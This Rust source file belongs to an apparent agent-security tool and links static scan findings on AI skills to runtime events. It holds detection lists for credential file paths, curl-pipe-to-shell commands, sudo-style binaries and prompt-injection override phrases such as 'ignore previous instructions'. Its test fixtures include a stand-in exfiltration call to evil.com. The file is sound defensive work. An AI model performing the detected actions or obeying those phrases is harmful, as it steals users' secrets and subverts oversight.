// SPDX-License-Identifier: Apache-2.0
// skill_correlation.rs — Static↔Runtime Correlation Engine (Phase 3)
//
// Links SkillSpector static scan findings to runtime kernel syscalls.
// When a runtime SecurityEvent matches the same threat category as a static
// finding from the skill scan, we emit a CorrelatedThreat — proving that
// the code we flagged at rest is actually executing the suspicious behavior.
//
// This is Ring Zero's unique value prop: static scan says "this code CAN
// exfiltrate data", runtime says "this process IS making network calls",
// correlation says "confirmed threat — the code we warned about is live."

use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::Arc;
use tokio::sync::RwLock;

use crate::common::event::{EventKind, SecurityEvent};
use crate::scanner::patterns::models::PatternFinding;
use crate::scanner::skill_surface::SkillRootResult;

// ── Types ───────────────────────────────────────────────────────────────────

/// A confirmed threat: static finding + runtime event in the same category.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CorrelatedThreat {
    /// The runtime event that triggered the correlation.
    pub event_id: String,
    /// Summary of the static finding that matches.
    pub static_finding: StaticFindingSummary,
    /// Human-readable runtime event summary.
    pub runtime_summary: String,
    /// Combined confidence: static_confidence * 1.3, capped at 1.0.
    pub confidence: f32,
    /// SkillSpector category (e.g., "credential_access").
    pub category: String,
    /// When the correlation was made.
    pub timestamp: DateTime<Utc>,
    /// Process that triggered the runtime event.
    pub pid: u32,
    pub process: String,
}

/// Lightweight summary of a static finding (avoids cloning the full PatternFinding).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StaticFindingSummary {
    pub rule_id: String,
    pub pattern_name: String,
    pub severity: String,
    pub confidence: f32,
    pub file: String,
    pub matched_text: Option<String>,
}

impl From<&PatternFinding> for StaticFindingSummary {
    fn from(f: &PatternFinding) -> Self {
        StaticFindingSummary {
            rule_id: f.rule_id.clone(),
            pattern_name: f.pattern_name.clone(),
            severity: f.severity.as_str().to_string(),
            confidence: f.confidence,
            file: f.file.clone(),
            matched_text: f.matched_text.clone(),
        }
    }
}

// ── Category mapping ────────────────────────────────────────────────────────

/// Map a SecurityEvent to a SkillSpector threat category.
/// Uses the same logic as enforcement.rs `evaluate_event` but without needing
/// the EnforcementSection config — we only need the category name, not the action.
fn event_to_category(ev: &SecurityEvent) -> Option<&'static str> {
    // Reuse the same credential-path prefixes from enforcement.rs
    const CREDENTIAL_PREFIXES: &[&str] = &[
        "/.ssh/",
        "/.aws/",
        "/.kube/",
        "/.gnupg/",
        "/.config/gcloud/",
        "/.azure/",
        "/.docker/config.json",
        "/.npmrc",
        "/.pypirc",
        "/.netrc",
        "/.git-credentials",
    ];
    let is_cred = || CREDENTIAL_PREFIXES.iter().any(|p| ev.target.contains(p));

    const SKILL_CONFIG_FILES: &[&str] = &[
        "CLAUDE.md",
        ".cursorrules",
        "SKILL.md",
        ".claude/",
        ".cursor/",
    ];
    let is_skill_cfg = || SKILL_CONFIG_FILES.iter().any(|n| ev.target.contains(n));

    const PRIV_ESC_BINS: &[&str] = &["sudo", "su", "pkexec", "doas"];
    let is_priv_esc = || {
        PRIV_ESC_BINS
            .iter()
            .any(|bin| ev.target == *bin || ev.target.ends_with(&format!("/{}", bin)))
    };

    let is_curl_pipe = || {
        let lower = ev.target.to_ascii_lowercase();
        (lower.contains("curl") || lower.contains("wget"))
            && (lower.contains("| bash")
                || lower.contains("| sh")
                || lower.contains("|bash")
                || lower.contains("|sh")
                || lower.contains("| /bin/bash")
                || lower.contains("| /bin/sh"))
    };

    match ev.kind {
        EventKind::FileOpen | EventKind::FileCreate | EventKind::FileWrite if is_cred() => {
            Some("credential_access")
        }

        EventKind::FileWrite | EventKind::FileCreate if is_skill_cfg() => Some("memory_poisoning"),

        EventKind::FileOpen if is_skill_cfg() => Some("rogue_agent"),

        EventKind::NetworkConnect | EventKind::NetworkSend => Some("data_exfiltration"),

        EventKind::ProcessExec if is_priv_esc() => Some("privilege_escalation"),

        EventKind::ProcessExec if is_curl_pipe() => Some("supply_chain"),

        EventKind::LlmRequest => {
            let lower = ev.target.to_ascii_lowercase();
            const INJECTION_PATTERNS: &[&str] = &[
                "ignore previous instructions",
                "ignore all prior",
                "disregard above",
                "forget your instructions",
                "new instructions:",
                "system prompt:",
                "you are now",
                "act as if",
                "pretend you are",
                "override:",
                "[system]",
                "```system",
            ];
            if INJECTION_PATTERNS.iter().any(|pat| lower.contains(pat)) {
                Some("prompt_injection")
            } else {
                None
            }
        }

        EventKind::DlpPii => Some("data_exfiltration"),
        EventKind::McpToolCall => Some("mcp_tool_poisoning"),
        EventKind::OffensivePrompt => Some("harmful_content"),
        EventKind::ProxyDetection => Some("prompt_injection"),

        _ => None,
    }
}

// ── Engine ──────────────────────────────────────────────────────────────────

const MAX_THREATS: usize = 1000;

pub struct SkillCorrelationEngine {
    /// Cached static findings from the last skill scan, grouped by category.
    findings_by_category: Arc<RwLock<HashMap<String, Vec<PatternFinding>>>>,
    /// Recent correlated threats (ring buffer, max MAX_THREATS).
    correlated: Arc<RwLock<Vec<CorrelatedThreat>>>,
}

impl SkillCorrelationEngine {
    pub fn new() -> Self {
        SkillCorrelationEngine {
            findings_by_category: Arc::new(RwLock::new(HashMap::new())),
            correlated: Arc::new(RwLock::new(Vec::new())),
        }
    }

    /// Called after a skill scan completes. Indexes all pattern findings by
    /// their category so runtime lookups are O(1) by category.
    pub async fn update_scan_results(&self, results: &[SkillRootResult]) {
        let mut by_cat: HashMap<String, Vec<PatternFinding>> = HashMap::new();

        for root in results {
            for finding in &root.pattern_findings {
                by_cat
                    .entry(finding.category.clone())
                    .or_default()
                    .push(finding.clone());
            }
        }

        let mut lock = self.findings_by_category.write().await;
        *lock = by_cat;
    }

    /// Called for each runtime SecurityEvent. If the event's category matches
    /// a static finding category, emits a CorrelatedThreat.
    pub async fn correlate(&self, event: &SecurityEvent) -> Option<CorrelatedThreat> {
        let category = event_to_category(event)?;

        let findings = self.findings_by_category.read().await;
        let matching = findings.get(category)?;

        if matching.is_empty() {
            return None;
        }

        // Pick the highest-confidence static finding for this category.
        let best = matching.iter().max_by(|a, b| {
            a.confidence
                .partial_cmp(&b.confidence)
                .unwrap_or(std::cmp::Ordering::Equal)
        })?;

        // Combined confidence: static * 1.3 (runtime confirmation boost), capped at 1.0.
        let combined = (best.confidence * 1.3).min(1.0);

        let threat = CorrelatedThreat {
            event_id: event.id.clone(),
            static_finding: StaticFindingSummary::from(best),
            runtime_summary: format!(
                "{:?} on '{}' by {} (pid {})",
                event.kind, event.target, event.process, event.pid
            ),
            confidence: combined,
            category: category.to_string(),
            timestamp: Utc::now(),
            pid: event.pid,
            process: event.process.clone(),
        };

        // Append to ring buffer.
        let mut buf = self.correlated.write().await;
        if buf.len() >= MAX_THREATS {
            buf.remove(0);
        }
        buf.push(threat.clone());

        Some(threat)
    }

    /// Return the most recent correlated threats (newest first).
    pub async fn recent_threats(&self, limit: usize) -> Vec<CorrelatedThreat> {
        let buf = self.correlated.read().await;
        buf.iter().rev().take(limit).cloned().collect()
    }

    /// Number of cached static findings across all categories.
    pub async fn static_finding_count(&self) -> usize {
        let findings = self.findings_by_category.read().await;
        findings.values().map(|v| v.len()).sum()
    }

    /// Categories that have static findings loaded.
    pub async fn loaded_categories(&self) -> Vec<String> {
        let findings = self.findings_by_category.read().await;
        findings.keys().cloned().collect()
    }
}

// ── Tests ───────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use crate::common::event::EventKind;
    use crate::scanner::patterns::models::{PatternFinding, Severity};

    fn test_event(kind: EventKind, target: &str) -> SecurityEvent {
        SecurityEvent {
            id: "ev-1".into(),
            kind,
            pid: 1234,
            uid: 1000,
            process: "agent-x".into(),
            target: target.into(),
            allowed: true,
            reason: None,
            timestamp: Utc::now(),
            ppid: None,
            parent_process: None,
            llm_context: None,
            extra: None,
        }
    }

    fn test_finding(category: &str, confidence: f32) -> PatternFinding {
        PatternFinding {
            rule_id: "E1".into(),
            pattern_name: "data_exfiltration_url".into(),
            category: category.into(),
            severity: Severity::High,
            confidence,
            message: "Sends data to external URL".into(),
            file: "/home/user/.claude/skills/evil/main.py".into(),
            start_line: 10,
            matched_text: Some("requests.post('https://evil.com')".into()),
            explanation: "Test".into(),
            remediation: "Remove it".into(),
        }
    }

    fn test_skill_root_result(findings: Vec<PatternFinding>) -> SkillRootResult {
        SkillRootResult {
            agent: "claude".into(),
            kind: "skills".into(),
            path: "/home/user/.claude/skills".into(),
            owner: "user".into(),
            files_scanned: 5,
            injection_reports: vec![],
            supply_findings: vec![],
            pattern_findings: findings,
            risk: "high".into(),
            also_reachable_from: vec![],
        }
    }

    #[tokio::test]
    async fn correlates_network_event_with_exfiltration_finding() {
        let engine = SkillCorrelationEngine::new();

        // Load a static finding for data_exfiltration
        let finding = test_finding("data_exfiltration", 0.85);
        let root = test_skill_root_result(vec![finding]);
        engine.update_scan_results(&[root]).await;

        // Fire a runtime network event
        let ev = test_event(EventKind::NetworkConnect, "https://evil.com");
        let threat = engine.correlate(&ev).await;

        assert!(threat.is_some());
        let t = threat.unwrap();
        assert_eq!(t.category, "data_exfiltration");
        assert_eq!(t.pid, 1234);
        // 0.85 * 1.3 = 1.105, capped at 1.0
        assert!((t.confidence - 1.0).abs() < 0.01);
    }

    #[tokio::test]
    async fn no_correlation_without_matching_findings() {
        let engine = SkillCorrelationEngine::new();

        // Load findings only for credential_access
        let finding = test_finding("credential_access", 0.9);
        let root = test_skill_root_result(vec![finding]);
        engine.update_scan_results(&[root]).await;

        // Fire a network event (data_exfiltration category) — no match
        let ev = test_event(EventKind::NetworkConnect, "https://example.com");
        let threat = engine.correlate(&ev).await;
        assert!(threat.is_none());
    }

    #[tokio::test]
    async fn no_correlation_without_scan_results() {
        let engine = SkillCorrelationEngine::new();

        let ev = test_event(EventKind::NetworkConnect, "https://evil.com");
        let threat = engine.correlate(&ev).await;
        assert!(threat.is_none());
    }

    #[tokio::test]
    async fn recent_threats_returns_newest_first() {
        let engine = SkillCorrelationEngine::new();

        let finding = test_finding("data_exfiltration", 0.7);
        let root = test_skill_root_result(vec![finding]);
        engine.update_scan_results(&[root]).await;

        // Fire two events
        let ev1 = SecurityEvent {
            id: "ev-1".into(),
            ..test_event(EventKind::NetworkConnect, "https://a.com")
        };
        let ev2 = SecurityEvent {
            id: "ev-2".into(),
            ..test_event(EventKind::NetworkSend, "https://b.com")
        };

        engine.correlate(&ev1).await;
        engine.correlate(&ev2).await;

        let recent = engine.recent_threats(10).await;
        assert_eq!(recent.len(), 2);
        assert_eq!(recent[0].event_id, "ev-2"); // newest first
        assert_eq!(recent[1].event_id, "ev-1");
    }

    #[tokio::test]
    async fn ring_buffer_caps_at_max() {
        let engine = SkillCorrelationEngine::new();

        let finding = test_finding("data_exfiltration", 0.5);
        let root = test_skill_root_result(vec![finding]);
        engine.update_scan_results(&[root]).await;

        // Fire MAX_THREATS + 10 events
        for i in 0..(MAX_THREATS + 10) {
            let ev = SecurityEvent {
                id: format!("ev-{}", i),
                ..test_event(EventKind::NetworkConnect, "https://x.com")
            };
            engine.correlate(&ev).await;
        }

        let recent = engine.recent_threats(MAX_THREATS + 100).await;
        assert_eq!(recent.len(), MAX_THREATS);
    }

    #[tokio::test]
    async fn credential_access_correlation() {
        let engine = SkillCorrelationEngine::new();

        let finding = test_finding("credential_access", 0.75);
        let root = test_skill_root_result(vec![finding]);
        engine.update_scan_results(&[root]).await;

        let ev = test_event(EventKind::FileOpen, "/home/user/.ssh/id_rsa");
        let threat = engine.correlate(&ev).await;

        assert!(threat.is_some());
        let t = threat.unwrap();
        assert_eq!(t.category, "credential_access");
        // 0.75 * 1.3 = 0.975
        assert!((t.confidence - 0.975).abs() < 0.01);
    }

    #[test]
    fn event_to_category_maps_correctly() {
        let ev = test_event(EventKind::NetworkConnect, "https://evil.com");
        assert_eq!(event_to_category(&ev), Some("data_exfiltration"));

        let ev = test_event(EventKind::FileOpen, "/home/user/.ssh/id_rsa");
        assert_eq!(event_to_category(&ev), Some("credential_access"));

        let ev = test_event(EventKind::ProcessExec, "sudo");
        assert_eq!(event_to_category(&ev), Some("privilege_escalation"));

        let ev = test_event(EventKind::ProcessExec, "/bin/ls");
        assert_eq!(event_to_category(&ev), None);

        let ev = test_event(EventKind::DlpPii, "SSN detected");
        assert_eq!(event_to_category(&ev), Some("data_exfiltration"));

        let ev = test_event(EventKind::McpToolCall, "some_tool");
        assert_eq!(event_to_category(&ev), Some("mcp_tool_poisoning"));
    }
}
